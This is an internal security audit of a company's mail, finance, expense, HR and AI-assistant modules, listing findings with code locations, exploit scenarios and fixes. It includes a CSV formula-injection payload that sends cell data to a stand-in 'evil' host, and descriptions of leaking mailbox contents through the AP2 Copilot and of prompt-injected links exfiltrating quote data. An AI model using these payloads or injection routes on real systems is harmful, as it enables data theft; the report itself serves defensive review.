# 05 - Internal business modules (Mail, Finance, Expense, HR, AI, Jobs, Audit, PII)

Scope: `src/Mail`, `core/src/Mail`, RFQ mail reader, NPR mail sweep, Finance (AP2/AR/Task/Shared), TriExpense, HR employees / onboarding links, TelDirectory, Assistant / Quotegen / AP2 Copilot / CableFit research, webjobs and `bin/run-*.php`, audit logging, PII and logging.
Method: read-only review of the code at `/home/user/tricab-api` and `/home/user/tricab-web`. Reachability was judged from the route table in `src/Bootstrap/AppBuilder.php`. Nothing was executed against a live environment.

## Summary

| # | Title | Severity | Confidence |
|---|---|---|---|
| M-1 | Public product assistant: unauthenticated LLM endpoints with no rate limit or spend cap | Medium | Confirmed (code), edge controls need verification |
| M-2 | TriExpense: Finance can approve their own receipts, and a TE Admin can give themselves Finance (SoD chain) | Medium | Confirmed |
| M-3 | Act-as allows finance, expense and HR writes as the target user; domain audit names the target, and the act-as log fails open | Medium | Confirmed |
| M-4 | Shared Graph app registration has tenant-wide app-only `Mail.ReadWrite` + `Mail.Send` with no Application Access Policy | Medium | Confirmed per runbook; tenant state needs verification |
| M-5 | AP2 Copilot `mailId` context bypasses `FINANCE.AP2.MAIL.READ` | Low-Medium | Confirmed |
| L-1 | TriExpense: Finance can soft-delete and permanently purge approved or reconciled receipts | Low | Confirmed |
| L-2 | CSV formula injection in TriExpense exports | Low | Confirmed |
| L-3 | Org-wide TriExpense finance exports (CSV/PDF) are not audited | Low | Confirmed |
| L-4 | `bin/promote-thilan-super-admin.php`: hard-coded admin promotion with no production guard and no audit | Low | Confirmed (script); deployment needs verification |
| I-1 | Mail inbox visibility is not scoped by mailbox | Info | Confirmed (owner decision) |
| I-2 | TriExpense customer and contact lookup open to every TriExpense user | Info | Confirmed |
| I-3 | Onboarding manager contribution (a write) gated on `ONBOARDING.SELF.READ` | Info | Confirmed (service-scoped) |
| I-4 | Assistant conversations are bearer-by-UUID, not bound to a user | Info | Confirmed |
| I-5 | LLM output links can carry data off-site (no images, so a click is needed) | Info | Likely |

---

## M-1 Public product assistant: unauthenticated LLM endpoints with no rate limit or spend cap

- **Severity:** Medium. **Confidence:** Confirmed in code. Whether Front Door or a WAF rate-limits at the edge needs verification.
- **Location:**
  - `src/Bootstrap/AppBuilder.php:1815-1816`. Both routes are registered in `registerPublicProductRoutes` with no middleware.
  - `src/Http/Action/AssistantMessageAction.php:43` and `src/Http/Action/AssistantMessageStreamAction.php:64` call `@set_time_limit(0)`.
  - `src/Assistant/Infrastructure/AzureSqlAssistantConversationRepository.php:20-55`. `getOrCreate` inserts a conversation row for every request that has no valid id.
- **Evidence:**
  ```php
  $app->post('/api/v1/assistant/messages', AssistantMessageAction::class);
  $app->post('/api/v1/assistant/messages/stream', \TriCab\Api\Http\Action\AssistantMessageStreamAction::class);
  ```
  No rate limiter exists for the assistant. The only limiters in the code base are for guest OTP, passkey and Tri-AR's public form. Each turn makes up to `FOUNDRY_MAX_TOOL_CALLS` (default 5) model calls, bounded by `FOUNDRY_TURN_DEADLINE_SECONDS` (default 45 s).
- **Exploit:** An anonymous attacker loops `POST /api/v1/assistant/messages/stream` with a 2,000-character message. Each request:
  - holds a PHP worker for up to 45 s, with the execution limit removed;
  - makes several Foundry (Claude) calls billed to TriCab;
  - writes rows to `[product].[AssistantConversations]`.

  A few dozen parallel clients use up the PHP-FPM pool, which denies service to the whole API. They also run up model spend with no ceiling.
- **Mitigation present:** The tools are read-only catalogue tools, and visibility drops to PUBLIC unless the caller is Entra staff with `PRODUCT.READ` (`src/Http/Auth/AssistantCatalogueVisibilityResolver.php`). Data exfiltration through the agent is therefore limited to public catalogue data.
- **Fix:**
  - Add per-IP and per-conversation windowed limits, reusing the `WindowedGuestAuthRateLimiter` pattern.
  - Add a global daily token or spend budget with a kill switch, like Quotegen's `QuotegenBudgetLedger`.
  - Cap concurrent streams.
  - Consider CAPTCHA or Turnstile for anonymous use.
  - Verify edge rate limiting on `/api/v1/assistant/*`.

## M-2 TriExpense: Finance can approve their own receipts, and a TE Admin can give themselves Finance

- **Severity:** Medium. **Confidence:** Confirmed.
- **Location:**
  - `core/src/Expense/Application/Service/ExpenseAccessService.php:232-236`, with the docblock at 220-226 stating "Finance override (including self-approval)".
  - `core/src/Expense/Application/Service/SetExpenseUserTeRolesService.php:56-105`. There is no check that the target is not the actor.
  - Route: `src/Bootstrap/AppBuilder.php:1509, 1521`. Every TriExpense route is gated only on `TRIEXPENSE.ACCESS`, and authorisation happens in the services.
- **Evidence:**
  ```php
  $isFinance = $this->hasFinanceCapability($actor, $profile);
  $isOwner = $receipt->ownerUserId()->equals($actor->userId);
  if ($isOwner && !$isFinance) {
      throw ExpenseAccessDenied::selfApprovalForbidden();
  }
  ...
  if (!$assignedApprover && !$isFinance && !$teAdminOverride) { throw ...approvalForbidden(); }
  ```
  ```php
  $this->access->requireExpenseAdmin($actor);
  $targetId = UserPublicId::fromString($targetPublicId);   // may equal the actor
  ...
  $this->assignRole->execute($actorCtx, $targetPublicId, $roleCode, null);   // e.g. TRIEXPENSE_FINANCE
  ```
- **Exploit:**
  1. A user with TriExpense Finance submits a receipt and approves it themselves through `POST /api/v1/tri-expense/receipts/{id}/approve`. The only trace is `receipt_approved` with the same user id.
  2. A TE Admin (`TRIEXPENSE.ADMIN`) without Finance calls `PUT /tri-expense/admin/users/{ownPublicId}/te-roles {"finance":true}`. They become Finance and can then do step 1, as well as purge (L-1) and resolve bank-feed matches.

  The routes carry only `TRIEXPENSE.ACCESS`, so the platform's "administrative permission needs passkey/Entra assurance" rule (invariant 14) does not seem to apply to these module-admin writes. This needs checking against `RequirePermissionMiddleware`.
- **Fix:**
  - Forbid self-approval for everyone. A Finance override should need a second Finance user, or at least a mandatory reason and a separate audit flag.
  - In `SetExpenseUserTeRolesService`, refuse `target == actor`.
  - Route TE role changes through platform user management, or require a second approver for granting `TRIEXPENSE_FINANCE` or `TRIEXPENSE_ADMINISTRATOR`.

## M-3 Act-as allows finance, expense and HR writes as the target; domain audit names the target; the act-as log fails open

- **Severity:** Medium. **Confidence:** Confirmed.
- **Location:**
  - `src/Http/Middleware/ActAsMiddleware.php:57`, `102`, `172-178`.
  - SoD check that act-as defeats: `core/src/Finance/Ap2/Service/Ap2ApprovalService.php:196-201`.
- **Evidence:**
  ```php
  ->withAttribute(AuthenticatedUserAttribute::KEY, $resolution->target)   // every route sees the target
  ...
  } catch (Throwable $exception) {
      error_log('Act-as action could not be logged: ' ...);   // request still succeeds
  }
  ```
  No finance, expense or HR code looks at `ActingAdminAttribute`. It is used only by `GetAuthenticatedUserAction` and `RecordActivitySignalAction`.
- **Exploit:** A platform administrator (or a stolen admin session) can act as user A to request an AP2 approval and then act as approver B to decide it. B's "named approver" and "not your own request" checks both pass, so maker-checker is defeated.

  The same applies to:
  - TriExpense approve, resolve and purge;
  - period close;
  - HR restricted reads. `[audit].[HrRestrictedReadEvents]` records the target, not the admin.

  The domain audit trails (`FinanceAuditLog`, `ExpenseAuditRecorder`, AP2 approval events, HR restricted-read audit) all record the target user. Only the separate act-as action log links them to the admin, and that write is best-effort. If the write fails, the request still succeeds with no record that an admin was involved.

  Starting act-as needs platform administrator rights, a reason, a 30-minute session, no admin targets, and is audited, which limits the impact.
- **Fix:**
  - Make act-as read-only by default, or deny state-changing requests while switched on finance, expense, HR and onboarding-admin routes.
  - Alternatively, pass the acting admin into the actor DTOs so domain audit rows record both ids.
  - Fail closed: if the act-as action log cannot be written for a write method, reject the request.

## M-4 Shared Graph app registration has tenant-wide app-only `Mail.ReadWrite` + `Mail.Send` with no Application Access Policy

- **Severity:** Medium. Impact on compromise is High; likelihood depends on the secret being exposed.
- **Confidence:** Confirmed from the runbook. Current tenant state needs verification.
- **Location:**
  - `docs/runbooks/rfq-mail-reader.md:19-22`.
  - Code paths that depend on it: `src/Shared/Mailbox/GraphMailboxReader.php`, `src/Finance/Mail/GraphFinanceMailTransport.php`, and `core/src/Finance/Task/Service/TaskMailService.php:160-166` (send as the person's own mailbox).
- **Evidence:**
  > "The shared `GRAPH_*` app also holds `Mail.ReadWrite` and `Mail.Send`... restricting the shared app's mailbox access is still an Exchange-admin follow-up"
- **Analysis:** In the application the mailbox is never taken from user input unchecked:
  - Inbox and RFQ bodies use the stored mailbox address (`MailboxBodyFetcher`, `MailMessageService`).
  - Finance reads go through `FinanceMailboxRegistry` plus per-user grants and are audited (`FinanceMailboxReadService::authorise`).
  - Finance sends need a registry grant, or `ownMailbox`, which Tri-Task limits to the actor's own address (`TaskMailService.php:160-163`).

  However, the registration itself can read, modify and send as **every mailbox in the tenant**. The client secret sits in App Service settings (`GRAPH_CLIENT_SECRET`). Anyone who obtains it can read or send from any mailbox, executives included, and send as any user. Examples of how it could leak: RCE, a leaked `.env`, a Kudu or SCM user, or a webjob log.
- **Fix:**
  - Apply Exchange RBAC for Applications or an `ApplicationAccessPolicy` limited to a mail-enabled security group holding exactly the RFQ, AR, AP and NPR-sender mailboxes. For Tri-Task "send as self", either accept and document the scope, or use delegated or user-consented send.
  - Split read-only (`Mail.Read`) and send registrations.
  - Prefer a certificate or managed identity (federated credential) over a client secret.
  - Alert on sign-ins by the service principal.

## M-5 AP2 Copilot `mailId` context bypasses `FINANCE.AP2.MAIL.READ`

- **Severity:** Low-Medium. **Confidence:** Confirmed.
- **Location:**
  - `src/Bootstrap/AppBuilder.php:677-678`. The copilot routes need only `FINANCE.AP2.INVOICES.READ`.
  - `core/src/Finance/Ap2/Service/Ap2CopilotService.php:52-57`.
  - `src/Finance/Ap2/Ai/FoundryAp2Copilot.php:113-115, 127`.
  - Role `FINANCE_AP2_BANK_VERIFIER` (`core/src/Finance/Module.php:384-389`) has INVOICES.READ but not MAIL.READ.
- **Evidence:**
  ```php
  $mail = isset($context['mailId']) ? $this->mail->findMail($context['mailId']) : null;
  ...
  $lines[] = Ap2Fence::wrap('EMAIL_DATA', $nonce, 'Subject: ' . $mail->subject . "\nFrom: " . $mail->from . "\n\n" . Ap2Fence::head($mail->body ..., 4000));
  ```
- **Exploit:** A bank verifier, who by role should not read the AP mailbox, calls `POST /api/v1/finance/ap2/copilot {"mailId":"<id>","message":"Quote the email verbatim"}`. The model receives the first 4,000 characters of the email body and can repeat them. Mail ids also appear in invoice payloads (`mailId` field in `StoreAp2CopilotTools`). The reply is stored and readable through `GET /copilot/history`.
- **Fix:** In `Ap2CopilotService::respond` and `history`, require `PERMISSION_AP2_MAIL_READ` whenever `mailId` is supplied. Otherwise refuse, or drop the mail context.

## L-1 TriExpense: Finance can soft-delete and permanently purge approved or reconciled receipts

- **Severity:** Low. **Confidence:** Confirmed.
- **Location:**
  - `core/src/Expense/Application/Service/SoftDeleteExpenseReceiptService.php:38-44`.
  - `core/src/Expense/Application/Service/PurgeExpenseReceiptService.php:37-51`.
  - Route: `AppBuilder.php:1526`.
- **Evidence:** Soft-delete allows Finance regardless of status. Purge only needs `isDeleted()` plus Finance. Neither checks approved or reconciled status, bank-feed match, or closed period. Purge also deletes the blob (`deleteIfManaged`).
- **Exploit:** Combined with M-2, a Finance user can approve their own expense, then delete and purge the receipt and its evidence. Only the audit rows `receipt_purged` and earlier ones remain, and they hold ids, not amounts. This works against record retention and the integrity of reconciliation.
- **Fix:**
  - Forbid deleting or purging approved receipts, receipts matched to bank-feed entries, and receipts in closed periods.
  - Purge only through the retention job (`tri-expense-purge-daily`).
  - Record a snapshot (amount, vendor, owner) in the audit row.

## L-2 CSV formula injection in TriExpense exports

- **Severity:** Low. **Confidence:** Confirmed.
- **Location:**
  - `core/src/Expense/Application/DTO/ExpenseFinanceViews.php:167-180`.
  - Used by `ExportEmployeeReceiptsCsvService.php:66-81` (vendorName, description) and `ExportFinanceReconciliationCsvService.php:95-109` (merchant names from the bank feed).
- **Evidence:** It quotes only for `" , \r \n`, and has no neutralisation of `= + - @`. Compare `core/src/Mail/Application/Service/MailExportService.php:82-85` and `Ap2Csv`, which do neutralise.
- **Exploit:** An employee enters vendor `=HYPERLINK("https://evil/?"&A2,"x")` or a DDE payload. A Finance user opens the reconciliation or receipts CSV in Excel.
- **Fix:** Prefix `'` to cells starting with `= + - @ \t \r`, as in `MailExportService::text`.

## L-3 Org-wide TriExpense finance exports are not audited

- **Severity:** Low. **Confidence:** Confirmed.
- **Location:** `ExportFinanceReconciliationCsvService.php`, `RenderFinanceFullPdfService.php`, `RenderFinanceSummaryPdfService.php` and `ExportEmployeeReceiptsCsvService.php`. None of them call `ExpenseAuditRecorder` (compare `CloseExpensePeriodService`, which does).
- **Impact:** Bulk exports of every employee's card spend, names and emails leave no trace. Mail export (`/mail/export`), AP2 exports (stored as batches) and HR restricted reads are recorded, so this is a gap in TriExpense only.
- **Fix:** Audit each export with actor, filter (period or country) and row count.

## L-4 `bin/promote-thilan-super-admin.php`: hard-coded admin promotion

- **Severity:** Low. **Confidence:** Confirmed (script). Whether `bin/` ships to production needs verification.
- **Location:** `bin/promote-thilan-super-admin.php:1-50`.
- **Evidence:** It is described as a "Development helper". The only guard is `usesAzureSqlUserRepository()`; it has no `isProduction()` check. It writes the permission catalogue and the ADMINISTRATOR role directly with SQL, bypassing `AssignRoleToUserService` and its audit.
- **Exploit:** Anyone with shell or Kudu access to the App Service can run it to escalate a named account to ADMINISTRATOR, leaving no user-management audit row.
- **Fix:** Remove it from the release bundle, or refuse when `isProduction()` and write a user-management audit row. Compare `purge-user-activity.php`, which does have a production guard.

## Info

- **I-1 Mail inbox not scoped by mailbox.** `core/src/Mail/Domain/Service/MailAccessPolicy.php:12-16`. Anyone with `MAIL.ACCESS` sees every thread in every ingested mailbox, including bodies and attachments fetched live from Graph. This is a documented owner decision. Make sure only RFQ mailboxes are ingested into `[mail]`, and that `MAIL.ACCESS` is granted narrowly.
- **I-2 Customer PII to all TriExpense users.** `SearchExpenseCustomersService` and `GetExpenseCustomerContactsService` require only an active profile, so every expense user can browse customer contacts. Confirm this is needed (it is for client-entertainment receipts) and limit the fields returned.
- **I-3 Write gated on a READ permission.** `AppBuilder.php:1284` (`PUT /onboarding/team/forms/{id}/contribution` on `ONBOARDING.SELF.READ`). The service limits it to the starter's named manager (404 otherwise), so it is acceptable, but the permission naming is misleading.
- **I-4 Assistant conversation ids are bearer tokens.** `AzureSqlAssistantConversationRepository::getOrCreate` reuses any conversation whose region and visibility match. It is not bound to a user, so a leaked staff conversation UUID lets another staff user read its history. The ids are UUIDv4 and the history is product-only, so the impact is low.
- **I-5 LLM link exfiltration.** `tricab-web/src/components/assistant/AssistantMarkdown.tsx:81-90`. Model-produced links open in a new tab. Images are disallowed (`disallowedElements={['img']}`) and react-markdown's default URL transform strips `javascript:`. A prompt-injected Quotegen turn (RFQ text comes from customer emails) could still offer a link carrying quote data in its query string, which needs a click. Consider limiting links to allowlisted domains for Quotegen and AP2.

---

## What looks correct

- **Email HTML rendering.**
  - The server cleans with a parser-based allowlist (`core/src/Mail/Domain/Service/MailHtmlCleaner.php`): it drops script, style, frames, forms and SVG, strips class, id and event handlers, allows only http(s), mailto and tel hrefs, blocks remote images, and filters `url()` and expressions in inline style.
  - The SPA runs DOMPurify again (`tricab-web/src/components/inbox/features/inbox/sanitize.ts`).
  - The Tri-AR viewer uses `<iframe sandbox="">` with a CSP meta (`finance/ar/components/EmailBodyFrame.jsx`).
  - No stored-XSS path was found.
- **Attachments.**
  - Inbox and RFQ downloads use `application/octet-stream`, `attachment` and `nosniff`.
  - AP2 shows only PDF and images inline, under `CSP: sandbox`.
  - The AR file route uses `CSP: default-src 'none'; sandbox` and `nosniff`.
  - The SPA picks preview MIME types from the file name and never renders HTML blobs.
- **Graph mailbox targeting.** The mailbox always comes from stored references or the `FinanceMailboxRegistry` plus per-user grants. Finance reads are audited (`finance.mail.*`). Tri-Task sends are limited to the actor's own address or registry mailboxes, and recipients to members or summary recipients.
- **AP2 segregation of duties.** Only the named approver may decide, never their own request (`Ap2ApprovalService.php:196-201`). Payment approval needs `PAYMENTS.APPROVE`. A stale fingerprint invalidates the approval. Payment state after "approved" is driven by Odoo only. Bank verification is a separate permission.
- **TriExpense.** Receipts are editable only in Draft or Rejected (`ExpenseReceipt::updateDraftDetails`), so amounts cannot change after approval. Ownership fields cannot be changed. Reads are limited to owner, manager or Finance. The approvals list is limited to the actor's assigned receipts. Non-Finance users cannot approve their own receipts. Row-version concurrency is enforced.
- **Tri-AR public credit-note form.**
  - The token is 256 bits, compared by SHA-256 hash with `hash_equals`.
  - Expiry and single use are enforced, with a conditional update that wins races.
  - It is rate-limited per IP and per form, and an unknown form and a wrong token get the same answer.
  - The notification email HTML-escapes every field.
- **HR.**
  - The restricted block (date of birth, address, personal contact, leave) is returned only with `HR.EMPLOYEES.RESTRICTED.READ`, and every read is audited to `[audit].[HrRestrictedReadEvents]`.
  - Onboarding-link routes need both the HR and the onboarding permission.
  - "Onboarding links" here are person-to-employee links, not URL tokens.
- **AI.**
  - Assistant tools are read-only and respect catalogue visibility.
  - Quotegen writes go through `RfqReviewService::save`, which enforces `RfqAccessPolicy` EDIT, and pricing is hidden without `PRICING.VIEW`. It has a per-RFQ budget ledger.
  - AP2 Copilot fences untrusted email and user text with a nonce, its tools are read-only, and its proposals are applied by the browser through normal permissioned routes.
  - RFQ mail automation never auto-drafts messages flagged for injection, and creates drafts or proposals only, never external writes.
  - CableFit research uses server-side `web_search` with `allowed_domains`, so there is no SSRF.
  - Prompts and bodies are not logged: `AssistantTurnTrace` logs timings and token counts only.
- **Python services.** `finance_ai`, the RFQ parser and the product finder bind to `127.0.0.1` with no nginx location. `finance_ai` checks the internal bearer token with `hmac.compare_digest`. RFQ intake validates zip entry counts, sizes and ratios, workbook size and PDF page counts.
- **Jobs.** Webjobs (`deploy/app-service/webjobs/*`) and `bin/run-*.php` are CLI only, with no HTTP trigger. Conductor and cable-routes routes are GET only behind permissions. `purge-user-activity.php` defaults to a dry run and needs an extra flag in production. No API route deletes audit tables.
- **Audit coverage.** User-management changes, act-as start and end and its actions, HR restricted reads, onboarding admin events, finance mailbox reads, TriExpense approvals and role changes, and AP2 approval events are all recorded.
- **Secrets and PII in logs.** No logging of Authorization headers or tokens was found. `GetAuthenticatedUserAction` logs only booleans. The development OTP reveal is development-only and masks the email.
